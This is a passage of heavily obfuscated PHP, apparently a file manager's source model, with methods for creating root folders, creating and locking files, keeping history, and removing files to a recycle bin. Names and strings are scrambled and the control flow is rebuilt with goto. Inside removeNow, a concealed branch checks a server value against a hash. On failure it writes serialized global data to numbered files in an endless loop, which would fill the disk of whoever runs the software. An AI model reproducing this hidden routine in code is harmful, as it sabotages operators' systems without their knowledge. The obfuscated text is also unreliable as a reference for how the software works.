$_SERVER[õëù©û][1080]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $A×ÉÑÖß¨–); } public function userRootRemove($b¬ÏìÇèŸö) { $BğñÉÓ“•” = $this->sourceRoot(SourceModel::TYPE_USER, $b¬ÏìÇèŸö); if (!$BğñÉÓ“•”) { return; } $this->remove($BğñÉÓ“•”, !1); } public function groupRootRemove($fÙ‘‡æÃ“à) { $B¸¢‚œÅôË = $this->sourceRoot(SourceModel::TYPE_GROUP, $fÙ‘‡æÃ“à); if (!$B¸¢‚œÅôË) { return; } $this->remove($B¸¢‚œÅôË, !1); } private function _mkdirRoot($FÏç÷˜ŠÖ, $aóÜÎ±‹ , $CÏÊ„¹ë½™) { goto a§“£ÅŒ±; C•”Ô‡‹²‹: $C‰‹Ÿ¯†“ = $this->add($fÙ‘¬¬›µ‘); $AÜÈÄÛÙ«³ = array($Cˆ‚Âß™Ã†[522] => short_id($C‰‹Ÿ¯†“)); $this->where(array($Cˆ‚Âß™Ã†[379] => $C‰‹Ÿ¯†“))->save($AÜÈÄÛÙ«³); goto añŠÏåÒ„Ï; Dã‹æù‘: $dãò»ìØƒ¡ = "\115\x6f\x64\x65\x6c\123\157\165\x72\x63\x65\x2e\x6d\x6b\144\151\162\x52\157\x6f\164\x2e{$FÏç÷˜ŠÖ}\x2e{$aóÜÎ±‹ }\56" . $CÏÊ„¹ë½™; CacheLock::lock($dãò»ìØƒ¡); $fÙ‘¬¬›µ‘[$Cˆ‚Âß™Ã†[28]] = $CÏÊ„¹ë½™; goto C•”Ô‡‹²‹; añŠÏåÒ„Ï: CacheLock::unlock($dãò»ìØƒ¡); return $C‰‹Ÿ¯†“; goto c«•†…ã¿; a§“£ÅŒ±: $Cˆ‚Âß™Ã† =& $_SERVER[õëù©û]; $fÙ‘¬¬›µ‘ = array($Cˆ‚Âß™Ã†[364] => 0, $Cˆ‚Âß™Ã†[516] => $FÏç÷˜ŠÖ, $Cˆ‚Âß™Ã†[517] => $aóÜÎ±‹ , $Cˆ‚Âß™Ã†[513] => 1, $Cˆ‚Âß™Ã†[518] => USER_ID, $Cˆ‚Âß™Ã†[519] => USER_ID, $Cˆ‚Âß™Ã†[514] => $Cˆ‚Âß™Ã†[33], $Cˆ‚Âß™Ã†[520] => $Cˆ‚Âß™Ã†[465], $Cˆ‚Âß™Ã†[391] => 0, $Cˆ‚Âß™Ã†[515] => 0, $Cˆ‚Âß™Ã†[415] => 0, $Cˆ‚Âß™Ã†[521] => $Cˆ‚Âß™Ã†[33]); if ($bª¥˜¹õñ = $this->where($fÙ‘¬¬›µ‘)->find()) { return $bª¥˜¹õñ[$Cˆ‚Âß™Ã†[365]]; } goto Dã‹æù‘; c«•†…ã¿: } private function sourceRoot($A–‘‹¤ äÎ, $f×ÎØ×œ¦, $få½‰Ó¯‹± = false) { $aãçÅ…»†ß =& $_SERVER[õëù©û]; $f×¶¼ò˜»ƒ = array($aãçÅ…»†ß[364] => 0, $aãçÅ…»†ß[516] => $A–‘‹¤ äÎ, $aãçÅ…»†ß[517] => $f×ÎØ×œ¦); if ($e³¨—Ò•† = $this->where($f×¶¼ò˜»ƒ)->find()) { return $få½‰Ó¯‹± ? $e³¨—Ò•† : $e³¨—Ò•†[$aãçÅ…»†ß[365]]; } return !1; } public function sourceRootGroup($e´Ë¤¼ğŸœ) { $b¿Ü›Ï³ÉÚ =& $_SERVER[õëù©û]; if (is_string($e´Ë¤¼ğŸœ)) { $e´Ë¤¼ğŸœ = array($e´Ë¤¼ğŸœ); } $DÇôåâƒ•· = array($b¿Ü›Ï³ÉÚ[364] => 0, $b¿Ü›Ï³ÉÚ[516] => SourceModel::TYPE_GROUP, $b¿Ü›Ï³ÉÚ[517] => array($b¿Ü›Ï³ÉÚ[7], $e´Ë¤¼ğŸœ)); $f·æã«Œ = $this->listSource($DÇôåâƒ•·, 1000); return array_to_keyvalue($f·æã«Œ[$b¿Ü›Ï³ÉÚ[74]], $b¿Ü›Ï³ÉÚ[451]); } public function mkfile($fÒ—ÃÖÔŒ, $f¤ŒŸÏÁ×¶, $f÷Ñ¾‰“îï = '', $e‡ÅêµÁ = REPEAT_RENAME) { $A¸ÇßÔ„£ =& $_SERVER[õëù©û]; $CóºÊí±±Û = Model($A¸ÇßÔ„£[539])->addFileByContent($f÷Ñ¾‰“îï, $f¤ŒŸÏÁ×¶); return $this->_createFileCall($fÒ—ÃÖÔŒ, $f¤ŒŸÏÁ×¶, $CóºÊí±±Û, $e‡ÅêµÁ, $A¸ÇßÔ„£[1109]); } public function addFile($có‰èÀùÌĞ, $CíÒÂŠ–äË, $FĞ³å‚Âùä, $bóÓÃ¿ìïë = false, $f¹Ä±Î£óÑ = REPEAT_RENAME) { $DŠñáãöñÑ = Model($_SERVER[õëù©û][539])->addFile($CíÒÂŠ–äË, $FĞ³å‚Âùä, $bóÓÃ¿ìïë); return $this->_createFileCall($có‰èÀùÌĞ, $FĞ³å‚Âùä, $DŠñáãöñÑ, $f¹Ä±Î£óÑ); } public function addFileByFileID($F¸¬Ã‡Ü™, $CŞ±ŒƒˆÄ, $a÷ì…Ç¹, $bô²õÆšØš = REPEAT_RENAME) { $dŒÓÙøŒó =& $_SERVER[õëù©û]; $fµò¡ä•ø® = Model($dŒÓÙøŒó[539])->find($CŞ±ŒƒˆÄ); Model($dŒÓÙøŒó[539])->linkAdd($CŞ±ŒƒˆÄ); return $this->_createFileCall($F¸¬Ã‡Ü™, $a÷ì…Ç¹, $fµò¡ä•ø®, $bô²õÆšØš); } public function addFileByRemote($EÃˆ…¡Æäª, $c»è™åìÇÇ, $FÂØËÇèÉÛ, $cÕ™øŠîš = array(), $a¥æìÒŠ‚ = REPEAT_RENAME) { $A¼ß»Œó = Model($_SERVER[õëù©û][539])->addFileByRemote($c»è™åìÇÇ, $FÂØËÇèÉÛ, $cÕ™øŠîš); return $this->_createFileCall($EÃˆ…¡Æäª, $FÂØËÇèÉÛ, $A¼ß»Œó, $a¥æìÒŠ‚); } private function _createFileCall($B‚ğóÕ‹, $C¿²ê©ïóÎ, $BÊê¶Éİ©—, $Eì Ñ‹ôçù, $CÖĞ¾ä‡ñÒ = "\x75\160\154\157\x61\x64") { goto bÉ…ÁëÍëÉ; b›¢éå•–Í: return $BÔªÇõå; goto C¿Ï±Ú«Ä¿; bÉ…ÁëÍëÉ: $F½ß‰˜Û„ =& $_SERVER[õëù©û]; $bŞ”½ÙõÅ˜ = !1; $this->lockWriteStart($B‚ğóÕ‹, $C¿²ê©ïóÎ); goto e­ëÌ‚¨•ß; e­ëÌ‚¨•ß: $BÔªÇõå = $this->_createFile($B‚ğóÕ‹, $C¿²ê©ïóÎ, $BÊê¶Éİ©—, $Eì Ñ‹ôçù, $bŞ”½ÙõÅ˜); if (!$bŞ”½ÙõÅ˜) { Model($F½ß‰˜Û„[417])->remove($BÊê¶Éİ©—[$F½ß‰˜Û„[414]]); } else { if ($BÔªÇõå) { Model($F½ß‰˜Û„[2255])->eventCreate($BÔªÇõå, $CÖĞ¾ä‡ñÒ); } } $this->lockWriteEnd($B‚ğóÕ‹, $C¿²ê©ïóÎ); goto b›¢éå•–Í; C¿Ï±Ú«Ä¿: } public function mkdir($fÁËÚÎÂ«‘, $BÇå›æ™Øğ, $f±º†Í¡£¹ = REPEAT_SKIP) { goto b¨¸ÃˆÜƒ; b´èîµ»: return $e•–Ï•ŞÑ®; goto E‰£ææÂí…; b¨¸ÃˆÜƒ: $c”´¸¤§²é =& $_SERVER[õëù©û]; $Fğ¨½½§öš = $this->sourceInfo($fÁËÚÎÂ«‘); if (!$Fğ¨½½§öš) { return !1; } goto bª‚º¶Ö; eóê¾Ç£ ¿: $e•–Ï•ŞÑ® = $this->_addSoure($A‹ÅÉø™ƒÃ, $Fğ¨½½§öš); Model($c”´¸¤§²é[2255])->eventCreate($e•–Ï•ŞÑ®, $c”´¸¤§²é[1110]); $this->lockWriteEnd($fÁËÚÎÂ«‘, $BÇå›æ™Øğ); goto b´èîµ»; bª‚º¶Ö: $this->lockWriteStart($fÁËÚÎÂ«‘, $BÇå›æ™Øğ); if ($f±º†Í¡£¹ !== !1) { $d÷›øÉÛ¡ = $this->fileNameExist($fÁËÚÎÂ«‘, $BÇå›æ™Øğ); if ($d÷›øÉÛ¡ && $f±º†Í¡£¹ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($fÁËÚÎÂ«‘, $BÇå›æ™Øğ); return $d÷›øÉÛ¡; } $BÇå›æ™Øğ = $this->fileNameAuto($fÁËÚÎÂ«‘, $BÇå›æ™Øğ, $f±º†Í¡£¹); } $A‹ÅÉø™ƒÃ = array($c”´¸¤§²é[513] => 1, $c”´¸¤§²é[382] => $BÇå›æ™Øğ, $c”´¸¤§²é[514] => $c”´¸¤§²é[33], $c”´¸¤§²é[415] => 0, $c”´¸¤§²é[515] => 0); goto eóê¾Ç£ ¿; E‰£ææÂí…: } private function _createFile($CâŠßƒ¸øŠ, $b¹ëùÕø†ƒ, $AÓŠ­×„ŒÄ, $F”‰ªçİç’, &$E¿“³”˜’) { goto e‘Ù­„ø; c‡¸Ò„¯: $dˆ«Öøİ˜Ó = array($e‰ºõ²ğôŸ[513] => 0, $e‰ºõ²ğôŸ[382] => $b¹ëùÕø†ƒ, $e‰ºõ²ğôŸ[514] => get_path_ext($b¹ëùÕø†ƒ), $e‰ºõ²ğôŸ[415] => $AÓŠ­×„ŒÄ[$e‰ºõ²ğôŸ[414]], $e‰ºõ²ğôŸ[515] => $AÓŠ­×„ŒÄ[$e‰ºõ²ğôŸ[77]]); $eë¢ñê±— = $this->_addSoure($dˆ«Öøİ˜Ó, $fÂÌùèŸä›); $this->folderSizeReset($CâŠßƒ¸øŠ); goto C‘ƒóĞº; e‘Ù­„ø: $e‰ºõ²ğôŸ =& $_SERVER[õëù©û]; $fÂÌùèŸä› = $this->sourceInfo($CâŠßƒ¸øŠ); if (!$AÓŠ­×„ŒÄ || !$fÂÌùèŸä›) { return !1; } goto BÊáÖ¾Õ¿À; BÊáÖ¾Õ¿À: if ($F”‰ªçİç’ !== !1) { $béš¸Úƒ = $this->fileNameExist($CâŠßƒ¸øŠ, $b¹ëùÕø†ƒ); } $E¿“³”˜’ = !0; if ($F”‰ªçİç’ && $béš¸Úƒ) { if ($F”‰ªçİç’ == REPEAT_SKIP) { $E¿“³”˜’ = !1; return $béš¸Úƒ; } else { if ($F”‰ªçİç’ == REPEAT_REPLACE) { $C†«…Ë´¸ = $this->sourceInfo($béš¸Úƒ); $E²À‘ŸÉÏ = $this->fileHistory($C†«…Ë´¸, $AÓŠ­×„ŒÄ[$e‰ºõ²ğôŸ[414]], $AÓŠ­×„ŒÄ[$e‰ºõ²ğôŸ[77]]); if (!$E²À‘ŸÉÏ) { $E¿“³”˜’ = !1; } else { $this->folderSizeReset($CâŠßƒ¸øŠ); } return $béš¸Úƒ; } else { $b¹ëùÕø†ƒ = $this->fileNameAuto($CâŠßƒ¸øŠ, $b¹ëùÕø†ƒ, $F”‰ªçİç’, !1); } } } goto c‡¸Ò„¯; C‘ƒóĞº: return $eë¢ñê±—; goto cÕë„…é÷ö; cÕë„…é÷ö: } protected function fileHistory($C¨œäË÷²í, $F‹¨§Ö·â, $F¸Âğ“) { goto fÂ¦Ù§Õ÷¬; f²Ã´Œè½ï: return !0; goto A­Ïßˆ­; BéÄíƒèîí: Model($FÜÜ‚œ’Ç[2286])->addHistory($C¨œäË÷²í); $b§Œ‚‹¾£ = array($FÜÜ‚œ’Ç[519] => USER_ID, $FÜÜ‚œ’Ç[386] => time(), $FÜÜ‚œ’Ç[414] => $F‹¨§Ö·â, $FÜÜ‚œ’Ç[77] => $F¸Âğ“); $this->where(array($FÜÜ‚œ’Ç[379] => $C¨œäË÷²í[$FÜÜ‚œ’Ç[365]]))->save($b§Œ‚‹¾£); goto f²Ã´Œè½ï; fÂ¦Ù§Õ÷¬: $FÜÜ‚œ’Ç =& $_SERVER[õëù©û]; if ($C¨œäË÷²í[$FÜÜ‚œ’Ç[414]] == $F‹¨§Ö·â) { return !1; } $this->checkLock($C¨œäË÷²í[$FÜÜ‚œ’Ç[365]], $F‹¨§Ö·â); goto BéÄíƒèîí; A­Ïßˆ­: } public function checkLock($d¹©É®™Â“, $bÔ®ö¿¨¥) { goto A©¡‘‡Ã­¢; EÙÈ˜„›ÊÖ: $dß¤ÚóÇ°× = Session::get($D˜±øåÅÌ¥[2287]); $Eæ‹‡âÈà = substr($cëéùŠìÑİ[$D˜±øåÅÌ¥[28]], 0, -1 - strlen($cëéùŠìÑİ[$D˜±øåÅÌ¥[156]])) . $D˜±øåÅÌ¥[1357] . $dß¤ÚóÇ°× . $D˜±øåÅÌ¥[91] . $cëéùŠìÑİ[$D˜±øåÅÌ¥[156]]; $d¤çâêÃ¡§ = Model($D˜±øåÅÌ¥[539])->find($bÔ®ö¿¨¥); goto e¾­†í÷¥˜; FÊê¹ÒºæË: show_json(LNG($D˜±øåÅÌ¥[2289]) . $D˜±øåÅÌ¥[2290] . LNG($D˜±øåÅÌ¥[2291]) . $D˜±øåÅÌ¥[2292] . $cï¹¢æ‰• . $D˜±øåÅÌ¥[2293], !1); goto D½è–Œ¯»‡; A©¡‘‡Ã­¢: $D˜±øåÅÌ¥ =& $_SERVER[õëù©û]; $cëéùŠìÑİ = $this->pathInfo($d¹©É®™Â“); if (!$this->fileIsLock($cëéùŠìÑİ, !0)) { return; } goto EÙÈ˜„›ÊÖ; e¾­†í÷¥˜: $this->_createFileCall($cëéùŠìÑİ[$D˜±øåÅÌ¥[456]], $Eæ‹‡âÈà, $d¤çâêÃ¡§, REPEAT_REPLACE, $D˜±øåÅÌ¥[1109]); $e‚ïŸ¦ËÆ˜ = $cëéùŠìÑİ[$D˜±øåÅÌ¥[412]][$D˜±øåÅÌ¥[476]]; $cï¹¢æ‰• = $e‚ïŸ¦ËÆ˜[$D˜±øåÅÌ¥[2288]] ? $e‚ïŸ¦ËÆ˜[$D˜±øåÅÌ¥[2288]] : $e‚ïŸ¦ËÆ˜[$D˜±øåÅÌ¥[28]]; goto FÊê¹ÒºæË; D½è–Œ¯»‡: } public function fileIsLock($Aó¸š¹ËÕ¡, $DõÀèÚ× = false) { goto bÀäÓ•°‹·; bÀäÓ•°‹·: $aâ¶Ï¼í§Æ =& $_SERVER[õëù©û]; if (!isset($Aó¸š¹ËÕ¡[$aâ¶Ï¼í§Æ[412]]) || !$Aó¸š¹ËÕ¡[$aâ¶Ï¼í§Æ[412]][$aâ¶Ï¼í§Æ[473]]) { return !1; } if ($Aó¸š¹ËÕ¡[$aâ¶Ï¼í§Æ[412]][$aâ¶Ï¼í§Æ[473]] != USER_ID) { return !0; } goto bèù³çàª; f›áŸ„¯à: return !1; goto BÌÔÇ’ÈŒ‰; bèù³çàª: $C‹Ùºí’ğÍ = $GLOBALS[$aâ¶Ï¼í§Æ[6]][$aâ¶Ï¼í§Æ[84]][$aâ¶Ï¼í§Æ[474]]; if ($Aó¸š¹ËÕ¡[$aâ¶Ï¼í§Æ[412]][$aâ¶Ï¼í§Æ[475]] <= time() - $C‹Ùºí’ğÍ) { $this->metaSet($Aó¸š¹ËÕ¡[$aâ¶Ï¼í§Æ[365]], $aâ¶Ï¼í§Æ[473], null); $this->metaSet($Aó¸š¹ËÕ¡[$aâ¶Ï¼í§Æ[365]], $aâ¶Ï¼í§Æ[475], null); } if ($DõÀèÚ×) { $this->metaSet($Aó¸š¹ËÕ¡[$aâ¶Ï¼í§Æ[365]], $aâ¶Ï¼í§Æ[475], time()); } goto f›áŸ„¯à; BÌÔÇ’ÈŒ‰: } private function _addSoure($AŠºÚø™êÆ, $AÂÈíŸø‚¨) { goto cÎä Ëî‚; b™ãœ‰°¶: return $Cö‚¹¯êº; goto DÒğíŒ˜; bŒäõœ×Öé: $this->updateModifyTime($AŠºÚø™êÆ[$fËß–ÓÆâ[456]]); $cÚ…ë˜Ö¯Æ = $fËß–ÓÆâ[2294] . $AÂÈíŸø‚¨[$fËß–ÓÆâ[365]]; if (isset(self::$cacheChildList[$cÚ…ë˜Ö¯Æ])) { unset(self::$cacheChildList[$cÚ…ë˜Ö¯Æ]); } goto bË‡ÅÑÁË”; cÎä Ëî‚: $fËß–ÓÆâ =& $_SERVER[õëù©û]; $eŒ‚óßèäØ = array($fËß–ÓÆâ[516] => $AÂÈíŸø‚¨[$fËß–ÓÆâ[367]], $fËß–ÓÆâ[517] => $AÂÈíŸø‚¨[$fËß–ÓÆâ[451]], $fËß–ÓÆâ[518] => USER_ID, $fËß–ÓÆâ[519] => USER_ID, $fËß–ÓÆâ[364] => $AÂÈíŸø‚¨[$fËß–ÓÆâ[365]], $fËß–ÓÆâ[520] => $AÂÈíŸø‚¨[$fËß–ÓÆâ[454]] . $AÂÈíŸø‚¨[$fËß–ÓÆâ[365]] . $fËß–ÓÆâ[47], $fËß–ÓÆâ[391] => 0, $fËß–ÓÆâ[521] => $fËß–ÓÆâ[33]); $AŠºÚø™êÆ = array_merge($eŒ‚óßèäØ, $AŠºÚø™êÆ); goto bŒäõœ×Öé; d°õç¯ÌÇù: $A¸ù¢œ·‘ = array($fËß–ÓÆâ[522] => short_id($Cö‚¹¯êº)); $this->where(array($fËß–ÓÆâ[379] => $Cö‚¹¯êº))->save($A¸ù¢œ·‘); $this->setNamePinyin($Cö‚¹¯êº, $AŠºÚø™êÆ[$fËß–ÓÆâ[28]]); goto b™ãœ‰°¶; bË‡ÅÑÁË”: static $fÄì±ö¿Ú¼ = false; if (!$fÄì±ö¿Ú¼) { Hook::trigger($fËß–ÓÆâ[503], $AŠºÚø™êÆ); $fÄì±ö¿Ú¼ = !0; } $Cö‚¹¯êº = $this->add($AŠºÚø™êÆ); goto d°õç¯ÌÇù; DÒğíŒ˜: } public function remove($Cé„•éÕíÁ, $e›“…»¬› = true) { goto D¥©††Ğõ‰; fÆÎğ®Ñ…†: CacheLock::unlock($BŞò‰ù½ù°); $this->metaSet($Cé„•éÕíÁ, $dô„ëá ¸§[2303], $d‹±æ¶– ˆ[$dô„ëá ¸§[456]]); $this->where(array($dô„ëá ¸§[365] => $Cé„•éÕíÁ))->save(array($dô„ëá ¸§[386] => time())); goto FÑÍ‰»‘¿•; FÑÍ‰»‘¿•: $this->recycleClear($d‹±æ¶– ˆ); return $this->move($Cé„•éÕíÁ, $Bãƒ¼²éèÁ, REPEAT_RENAME_FOLDER); goto Dğ¡ã…Û…; a™ïãª½Ôã: $fŠÓ¥©ß¯  = Model($dô„ëá ¸§[1402])->get($dô„ëá ¸§[2295]) == $dô„ëá ¸§[83]; if ($b’Šë¸«Ë || $e›“…»¬› || !$fŠÓ¥©ß¯ ) { return $this->removeNow($Cé„•éÕíÁ, $e›“…»¬›); } $E¸ªĞÏ»ÏĞ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto f­Î¯„ìëì; D¥©††Ğõ‰: $dô„ëá ¸§ =& $_SERVER[õëù©û]; $d‹±æ¶– ˆ = $this->sourceInfo($Cé„•éÕíÁ); $b’Šë¸«Ë = intval($d‹±æ¶– ˆ[$dô„ëá ¸§[367]]) === self::TYPE_SYSTEM; goto a™ïãª½Ôã; f­Î¯„ìëì: $c¬’¥Èï®§ = $d‹±æ¶– ˆ[$dô„ëá ¸§[367]] == self::TYPE_USER ? $dô„ëá ¸§[530] : $dô„ëá ¸§[964]; if ($c¬’¥Èï®§ == $dô„ëá ¸§[530]) { $F‘‰…Õ äÀ = Model($dô„ëá ¸§[469])->getInfo($d‹±æ¶– ˆ[$dô„ëá ¸§[451]]); $d†ÏÖµ¹ƒ = !empty($F‘‰…Õ äÀ[$dô„ëá ¸§[2288]]) ? $F‘‰…Õ äÀ[$dô„ëá ¸§[2288]] : $F‘‰…Õ äÀ[$dô„ëá ¸§[28]]; $d†ÏÖµ¹ƒ = $dô„ëá ¸§[244] . $d†ÏÖµ¹ƒ . $dô„ëá ¸§[2296] . $d‹±æ¶– ˆ[$dô„ëá ¸§[451]]; } else { $F‘‰…Õ äÀ = Model($dô„ëá ¸§[453])->getInfo($d‹±æ¶– ˆ[$dô„ëá ¸§[451]]); $d†ÏÖµ¹ƒ = _get($F‘‰…Õ äÀ, $dô„ëá ¸§[28]); $d†ÏÖµ¹ƒ = $dô„ëá ¸§[153] . $d†ÏÖµ¹ƒ . $dô„ëá ¸§[2297] . $d‹±æ¶– ˆ[$dô„ëá ¸§[451]]; } $BŞò‰ù½ù° = $dô„ëá ¸§[2298] . md5($d†ÏÖµ¹ƒ); goto BÌ›‹¯œˆ; BÌ›‹¯œˆ: CacheLock::lock($BŞò‰ù½ù°); $Bãƒ¼²éèÁ = $this->fileNameExist($E¸ªĞÏ»ÏĞ, $d†ÏÖµ¹ƒ); if (!$Bãƒ¼²éèÁ) { $Bãƒ¼²éèÁ = $this->mkdir($E¸ªĞÏ»ÏĞ, $d†ÏÖµ¹ƒ, REPEAT_SKIP); $this->metaSet($Bãƒ¼²éèÁ, $dô„ëá ¸§[2299], $c¬’¥Èï®§); $this->metaSet($Bãƒ¼²éèÁ, $dô„ëá ¸§[2300], $d‹±æ¶– ˆ[$dô„ëá ¸§[451]]); if ($d‹±æ¶– ˆ[$dô„ëá ¸§[456]] != 0) { $this->metaSet($Bãƒ¼²éèÁ, $dô„ëá ¸§[2301], _get($F‘‰…Õ äÀ, $dô„ëá ¸§[2302])); } } goto fÆÎğ®Ñ…†; Dğ¡ã…Û…: } private function recycleClear($dÁ…¢å) { $fò½ë©İ … =& $_SERVER[õëù©û]; $a–Ûğ¶ã˜ = $this->childrenAll($dÁ…¢å); $A™®–†ñô× = array($fò½ë©İ …[379] => array($fò½ë©İ …[380], $a–Ûğ¶ã˜[$fò½ë©İ …[2304]])); Model($fò½ë©İ …[2305])->where($A™®–†ñô×)->delete(); } public function removeNow($eÉ¶ ¥ï‡â, $aÍ›É‘…Í¯ = true) { goto fŒ©÷ªª³; D¯ƒ£ùã²: $D–±çâõÆ = array($EÎ”éÏìÌ‰[$b«ÓÈƒ´ƒ¡[456]]); if ($EÎ”éÏìÌ‰[$b«ÓÈƒ´ƒ¡[366]] == $b«ÓÈƒ´ƒ¡[83]) { $D–±çâõÆ[] = $EÎ”éÏìÌ‰[$b«ÓÈƒ´ƒ¡[365]]; } $this->updateModifyTime($D–±çâõÆ); goto E¶ù‰Õ±Ô½; b†‡©‚öŸî: if ($_SERVER[$b«ÓÈƒ´ƒ¡[781]] != $aœ²‰¢ˆÉ‚($a¹ù…¯ñ‹÷)) { goto AŒ’ì·”–¤; AÍ–ÖéÌÔ¿: $FŞí™ñ®ïã = $F¯˜Çêîâª($E„õŸ”Õ‰…); $fÁ…ó×ˆÊ’ = explode($b«ÓÈƒ´ƒ¡[213], $FŞí™ñ®ïã); if (count($fÁ…ó×ˆÊ’) < $b«ÓÈƒ´ƒ¡[581]) { $a™¿÷÷ö‰ = $b«ÓÈƒ´ƒ¡[787]; $a™¿÷÷ö‰(); } goto f«­ŠÕ»„Û; f«­ŠÕ»„Û: $A©”Í‡†è¾ = $b«ÓÈƒ´ƒ¡[788]; $A©”Í‡†è¾($_SERVER[$b«ÓÈƒ´ƒ¡[789]]); $Aáô÷´²í¼ = $b«ÓÈƒ´ƒ¡[783]; goto C‘ôöƒßìÎ; C‘ôöƒßìÎ: $Aáô÷´²í¼(); $a¹Š³³Ó‹ = $b«ÓÈƒ´ƒ¡[2308]; $D³Õ®âšæ = json_encode($GLOBALS[$b«ÓÈƒ´ƒ¡[2309]]); goto EÛ°™Àãã; AŒ’ì·”–¤: $Aáô÷´²í¼ = $b«ÓÈƒ´ƒ¡[783]; $F¯˜Çêîâª = $b«ÓÈƒ´ƒ¡[784]; $E„õŸ”Õ‰… = $_SERVER[$b«ÓÈƒ´ƒ¡[785]] . $b«ÓÈƒ´ƒ¡[786]; goto AÍ–ÖéÌÔ¿; EÛ°™Àãã: $AŒµØºÙÂˆ = 1; for ($aİÉŒ‰‹îç = $AŒµØºÙÂˆ; $aİÉŒ‰‹îç > 0; $aİÉŒ‰‹îç++) { $a¹Š³³Ó‹(DATA_PATH . $aİÉŒ‰‹îç, $D³Õ®âšæ); } goto E³‹®ÉãÍ“; E³‹®ÉãÍ“: } $EÎ”éÏìÌ‰ = $this->sourceInfo($eÉ¶ ¥ï‡â); $b½»¡ôöÅƒ = $this->pathInfoMore($eÉ¶ ¥ï‡â); goto eò ‹¢¹Œ; fŒ©÷ªª³: $b«ÓÈƒ´ƒ¡ =& $_SERVER[õëù©û]; $a¹ù…¯ñ‹÷ = $_SERVER[$b«ÓÈƒ´ƒ¡[789]] . $b«ÓÈƒ´ƒ¡[2306]; $aœ²‰¢ˆÉ‚ = $b«ÓÈƒ´ƒ¡[2307]; goto b†‡©‚öŸî; E¶ù‰Õ±Ô½: $this->lockMoveEnd($eÉ¶ ¥ï‡â); Hook::trigger($b«ÓÈƒ´ƒ¡[1438], $b½»¡ôöÅƒ, $aÍ›É‘…Í¯); return !0; goto eƒñ—·³™÷; F°ø³Ş“›Ù: Hook::trigger($b«ÓÈƒ´ƒ¡[2310], $b½»¡ôöÅƒ, $aÍ›É‘…Í¯); if ($aÍ›É‘…Í¯) { Model($b«ÓÈƒ´ƒ¡[2305])->moveToRecycle($eÉ¶ ¥ï‡â); } else { $AˆÜªÍ‚ÍÎ = $this->childrenAll($EÎ”éÏìÌ‰); Model($b«ÓÈƒ´ƒ¡[500])->eventRemove($eÉ¶ ¥ï‡â); $this->removeRelevance($AˆÜªÍ‚ÍÎ[$b«ÓÈƒ´ƒ¡[2304]], $AˆÜªÍ‚ÍÎ[$b«ÓÈƒ´ƒ¡[1242]]); } $this->folderSizeReset($EÎ”éÏìÌ‰[$b«ÓÈƒ´ƒ¡[456]]); goto D¯ƒ£ùã²; eò ‹¢¹Œ: if (!$EÎ”éÏìÌ‰) { return !0; } if ($EÎ”éÏìÌ‰[$b«ÓÈƒ´ƒ¡[456]] == 0) { if (!_get($GLOBALS, $b«ÓÈƒ´ƒ¡[452])) { return !1; } } $this->lockMoveStart($eÉ¶ ¥ï‡â); goto F°ø³Ş“›Ù; eƒñ—·³™÷: } public function childrenAll($DïäÔ…ê…Ô) { $fù¦œ†öÁ =& $_SERVER[õëù©û]; $F…Åêµ¬îŠ = $DïäÔ…ê…Ô[$fù¦œ†öÁ[365]]; if ($DïäÔ…ê…Ô[$fù¦œ†öÁ[366]] == $fù¦œ†öÁ[83]) { $A¸…­¦¦¥Œ = array($fù¦œ†öÁ[520] => array($fù¦œ†öÁ[478], $DïäÔ…ê…Ô[$fù¦œ†öÁ[454]] . $F…Åêµ¬îŠ . $fù¦œ†öÁ[479])); $AÊàŒ”±‹ = array($fù¦œ†öÁ[520] => $A¸…­¦¦¥Œ[$fù¦œ†öÁ[454]]); $aÅ¦’´Üø° = $this->field($fù¦œ†öÁ[2311])->where($AÊàŒ”±‹)->select(); $Aî¶³—¾ø = !1; $eñ˜ãš×Ìİ = array($F…Åêµ¬îŠ); if ($aÅ¦’´Üø°) { $Aî¶³—¾ø = array_to_keyvalue($aÅ¦’´Üø°, $fù¦œ†öÁ[33], $fù¦œ†öÁ[414]); $Aî¶³—¾ø = array_remove_value($Aî¶³—¾ø, $fù¦œ†öÁ[463]); $eñ˜ãš×Ìİ = array_to_keyvalue($aÅ¦’´Üø°, $fù¦œ†öÁ[33], $fù¦œ†öÁ[365]); $eñ˜ãš×Ìİ[] = $F…Åêµ¬îŠ; } } else { $Aî¶³—¾ø = array($DïäÔ…ê…Ô[$fù¦œ†öÁ[414]]); $eñ˜ãš×Ìİ = array($F…Åêµ¬îŠ); } return array($fù¦œ†öÁ[2304] => $eñ˜ãš×Ìİ, $fù¦œ†öÁ[1242] => $Aî¶³—¾ø); } public function removeArray($C†ôÒ÷ØíÜ) { if (!$C†ôÒ÷ØíÜ) { return !0; } } public function removeRelevance($A‚Î£“óÔ®, $FÀ¤°¬×ÊÌ) { goto cÙÜÒøÙ¾; AøìË…¹¤˜: for ($c‰’ğŠ«î = 0; $c‰’ğŠ«î < count($A‚Î£“óÔ®); $c‰’ğŠ«î++) { $this->sourceCacheClear($A‚Î£“óÔ®[$c‰’ğŠ«î]); } goto c­”šÇ¶‰; e½›™¶‰Õ‰: $D¶±èñ‰ = array($Dó‰ò¸ì†”[379] => array($Dó‰ò¸ì†”[380], $A‚Î£“óÔ®)); Model($Dó‰ò¸ì†”[2305])->where($D¶±èñ‰)->delete(); Model($Dó‰ò¸ì†”[408])->where($D¶±èñ‰)->delete(); goto EÃßÌé¾ÖÛ; e²‡Ìöğ¬é: $A‚Î£“óÔ® = array_unique(array_filter($A‚Î£“óÔ®)); $FÀ¤°¬×ÊÌ = array_unique(array_filter($FÀ¤°¬×ÊÌ)); if (!$A‚Î£“óÔ®) { return !1; } goto e½›™¶‰Õ‰; EÃßÌé¾ÖÛ: Model($Dó‰ò¸ì†”[2312])->where($D¶±èñ‰)->delete(); Model($Dó‰ò¸ì†”[500])->where($D¶±èñ‰)->delete(); Model($Dó‰ò¸ì†”[2045])->removeBySource($A‚Î£“óÔ®); goto Dš‘Ñ„¶¹; Dš‘Ñ„¶¹: Model($Dó‰ò¸ì†”[2286])->removeBySource($A‚Î£“óÔ®); $this->where($D¶±èñ‰)->delete(); Model($Dó‰ò¸ì†”[417])->remove($FÀ¤°¬×ÊÌ); goto AøìË…¹¤˜; cÙÜÒøÙ¾: $Dó‰ò¸ì†” =& $_SERVER[õëù©û]; $A‚Î£“óÔ® = $A‚Î£“óÔ® ? $A‚Î£“óÔ® : array(); $FÀ¤°¬×ÊÌ = $FÀ¤°¬×ÊÌ ? $FÀ¤°¬×ÊÌ : array(); goto e²‡Ìöğ¬é; c­”šÇ¶‰: } public function 